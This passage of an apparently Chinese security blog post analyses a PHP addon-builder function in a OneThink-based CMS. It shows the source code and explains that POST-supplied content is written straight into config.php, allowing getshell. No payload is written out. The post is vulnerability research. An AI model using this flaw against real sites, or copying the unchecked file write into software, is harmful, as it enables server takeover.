<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">build</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_POST</span>;</span><br><span class="line">        <span class="variable">$data</span>[<span class="string">&#x27;info&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] = trim(<span class="variable">$data</span>[<span class="string">&#x27;info&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$addonFile</span> = <span class="keyword">$this</span>-&gt;preview(<span class="literal">false</span>);</span><br><span class="line">        <span class="variable">$addons_dir</span> = ONETHINK_ADDON_PATH;</span><br><span class="line">        <span class="comment">//创建目录结构</span></span><br><span class="line">        <span class="variable">$files</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$addon_dir</span> = <span class="string">&quot;<span class="subst">$addons_dir</span><span class="subst">&#123;$data[&#x27;info&#x27;][&#x27;name&#x27;]&#125;</span>/&quot;</span>;</span><br><span class="line">        <span class="variable">$files</span>[] = <span class="variable">$addon_dir</span>;</span><br><span class="line">        <span class="variable">$addon_name</span> = <span class="string">&quot;<span class="subst">&#123;$data[&#x27;info&#x27;][&#x27;name&#x27;]&#125;</span>Addon.class.php&quot;</span>;</span><br><span class="line">        <span class="variable">$files</span>[] = <span class="string">&quot;<span class="subst">&#123;$addon_dir&#125;</span><span class="subst">&#123;$addon_name&#125;</span>&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$data</span>[<span class="string">&#x27;has_config&#x27;</span>] == <span class="number">1</span>) ;<span class="comment">//如果有配置文件</span></span><br><span class="line">        <span class="variable">$files</span>[] = <span class="variable">$addon_dir</span> . <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$data</span>[<span class="string">&#x27;has_outurl&#x27;</span>]) &#123;</span><br><span class="line">            <span class="variable">$files</span>[] = <span class="string">&quot;<span class="subst">&#123;$addon_dir&#125;</span>Controller/&quot;</span>;</span><br><span class="line">            <span class="variable">$files</span>[] = <span class="string">&quot;<span class="subst">&#123;$addon_dir&#125;</span>Controller/<span class="subst">&#123;$data[&#x27;info&#x27;][&#x27;name&#x27;]&#125;</span>Controller.class.php&quot;</span>;</span><br><span class="line">            <span class="variable">$files</span>[] = <span class="string">&quot;<span class="subst">&#123;$addon_dir&#125;</span>Model/&quot;</span>;</span><br><span class="line">            <span class="variable">$files</span>[] = <span class="string">&quot;<span class="subst">&#123;$addon_dir&#125;</span>Model/<span class="subst">&#123;$data[&#x27;info&#x27;][&#x27;name&#x27;]&#125;</span>Model.class.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$custom_config</span> = trim(<span class="variable">$data</span>[<span class="string">&#x27;custom_config&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$custom_config</span>)</span><br><span class="line">            <span class="variable">$data</span>[] = <span class="string">&quot;<span class="subst">&#123;$addon_dir&#125;</span><span class="subst">&#123;$custom_config&#125;</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$custom_adminlist</span> = trim(<span class="variable">$data</span>[<span class="string">&#x27;custom_adminlist&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$custom_adminlist</span>)</span><br><span class="line">            <span class="variable">$data</span>[] = <span class="string">&quot;<span class="subst">&#123;$addon_dir&#125;</span><span class="subst">&#123;$custom_adminlist&#125;</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">        create_dir_or_files(<span class="variable">$files</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//写文件</span></span><br><span class="line">        file_put_contents(<span class="string">&quot;<span class="subst">&#123;$addon_dir&#125;</span><span class="subst">&#123;$addon_name&#125;</span>&quot;</span>, <span class="variable">$addonFile</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$data</span>[<span class="string">&#x27;has_outurl&#x27;</span>]) &#123;</span><br><span class="line">            <span class="variable">$addonController</span> = <span class="string">&lt;&lt;&lt;str</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">namespace Addons\\<span class="subst">&#123;$data[&#x27;info&#x27;][&#x27;name&#x27;]&#125;</span>\Controller;</span></span><br><span class="line"><span class="string">use Home\Controller\AddonsController;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">class <span class="subst">&#123;$data[&#x27;info&#x27;][&#x27;name&#x27;]&#125;</span>Controller extends AddonsController&#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">str</span>;</span><br><span class="line">            file_put_contents(<span class="string">&quot;<span class="subst">&#123;$addon_dir&#125;</span>Controller/<span class="subst">&#123;$data[&#x27;info&#x27;][&#x27;name&#x27;]&#125;</span>Controller.class.php&quot;</span>, <span class="variable">$addonController</span>);</span><br><span class="line">            <span class="variable">$addonModel</span> = <span class="string">&lt;&lt;&lt;str</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">namespace Addons\\<span class="subst">&#123;$data[&#x27;info&#x27;][&#x27;name&#x27;]&#125;</span>\Model;</span></span><br><span class="line"><span class="string">use Think\Model;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/**</span></span><br><span class="line"><span class="string"> * <span class="subst">&#123;$data[&#x27;info&#x27;][&#x27;name&#x27;]&#125;</span>模型</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string">class <span class="subst">&#123;$data[&#x27;info&#x27;][&#x27;name&#x27;]&#125;</span>Model extends Model&#123;</span></span><br><span class="line"><span class="string">    public \$model = array(</span></span><br><span class="line"><span class="string">        &#x27;title&#x27;=&gt;&#x27;&#x27;,//新增[title]、编辑[title]、删除[title]的提示</span></span><br><span class="line"><span class="string">        &#x27;template_add&#x27;=&gt;&#x27;&#x27;,//自定义新增模板自定义html edit.html 会读取插件根目录的模板</span></span><br><span class="line"><span class="string">        &#x27;template_edit&#x27;=&gt;&#x27;&#x27;,//自定义编辑模板html</span></span><br><span class="line"><span class="string">        &#x27;search_key&#x27;=&gt;&#x27;&#x27;,// 搜索的字段名，默认是title</span></span><br><span class="line"><span class="string">        &#x27;extend&#x27;=&gt;1,</span></span><br><span class="line"><span class="string">    );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    public \$_fields = array(</span></span><br><span class="line"><span class="string">        &#x27;id&#x27;=&gt;array(</span></span><br><span class="line"><span class="string">            &#x27;name&#x27;=&gt;&#x27;id&#x27;,//字段名</span></span><br><span class="line"><span class="string">            &#x27;title&#x27;=&gt;&#x27;ID&#x27;,//显示标题</span></span><br><span class="line"><span class="string">            &#x27;type&#x27;=&gt;&#x27;num&#x27;,//字段类型</span></span><br><span class="line"><span class="string">            &#x27;remark&#x27;=&gt;&#x27;&#x27;,// 备注，相当于配置里的tip</span></span><br><span class="line"><span class="string">            &#x27;is_show&#x27;=&gt;3,// 1-始终显示 2-新增显示 3-编辑显示 0-不显示</span></span><br><span class="line"><span class="string">            &#x27;value&#x27;=&gt;0,//默认值</span></span><br><span class="line"><span class="string">        ),</span></span><br><span class="line"><span class="string">        &#x27;title&#x27;=&gt;array(</span></span><br><span class="line"><span class="string">            &#x27;name&#x27;=&gt;&#x27;title&#x27;,</span></span><br><span class="line"><span class="string">            &#x27;title&#x27;=&gt;L(&#x27;_TITLE_&#x27;),</span></span><br><span class="line"><span class="string">            &#x27;type&#x27;=&gt;&#x27;string&#x27;,</span></span><br><span class="line"><span class="string">            &#x27;remark&#x27;=&gt;&#x27;&#x27;,</span></span><br><span class="line"><span class="string">            &#x27;is_show&#x27;=&gt;1,</span></span><br><span class="line"><span class="string">            &#x27;value&#x27;=&gt;0,</span></span><br><span class="line"><span class="string">            &#x27;is_must&#x27;=&gt;1,</span></span><br><span class="line"><span class="string">        ),</span></span><br><span class="line"><span class="string">    );</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">str</span>;</span><br><span class="line">            file_put_contents(<span class="string">&quot;<span class="subst">&#123;$addon_dir&#125;</span>Model/<span class="subst">&#123;$data[&#x27;info&#x27;][&#x27;name&#x27;]&#125;</span>Model.class.php&quot;</span>, <span class="variable">$addonModel</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$data</span>[<span class="string">&#x27;has_config&#x27;</span>] == <span class="number">1</span>)</span><br><span class="line">            file_put_contents(<span class="string">&quot;<span class="subst">&#123;$addon_dir&#125;</span>config.php&quot;</span>, <span class="variable">$data</span>[<span class="string">&#x27;config&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;success(L(<span class="string">&#x27;_CREATE_SUCCESS_&#x27;</span>), U(<span class="string">&#x27;index&#x27;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h6 id="先进行post传参赋值给data，然后经过一系列的判断然后创建你插件名的文件夹，在文件夹里面创建两个文件一个config-php和插件名Action-php-而config-php的内容是可控的-即是否需要配置处"><a href="#先进行post传参赋值给data，然后经过一系列的判断然后创建你插件名的文件夹，在文件夹里面创建两个文件一个config-php和插件名Action-php-而config-php的内容是可控的-即是否需要配置处" class="headerlink" title="先进行post传参赋值给data，然后经过一系列的判断然后创建你插件名的文件夹，在文件夹里面创建两个文件一个config.php和插件名Action.php,而config.php的内容是可控的,即是否需要配置处"></a>先进行post传参赋值给data，然后经过一系列的判断然后创建你插件名的文件夹，在文件夹里面创建两个文件一个config.php和插件名Action.php,而config.php的内容是可控的,即是否需要配置处</h6><p><img src="https://ae01.alicdn.com/kf/H8f6b7cdb195143a0aa1c7be6bf2197731.png"></p>
<h6 id="不经过任何检测直接写入config-php-造成getshell"><a href="#不经过任何检测直接写入config-php-造成getshell" class="headerlink" title="不经过任何检测直接写入config.php,造成getshell"></a>不经过任何检测直接写入config.php,造成getshell</h6><p><img src="https://ae01.alicdn.com/kf/H17e887751a194dd5847fc5c5ca72d98aN.png"><img src="https://ae01.alicdn.com/kf/Hae32243dd36c4686b6334ea0b56d1974o.png"></p>
<img src="https://ae01.alicdn.com/kf/H3628e06d18dc4bfaba5c307634ab9b850.png" style="zoom:200%;" />]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
</search>
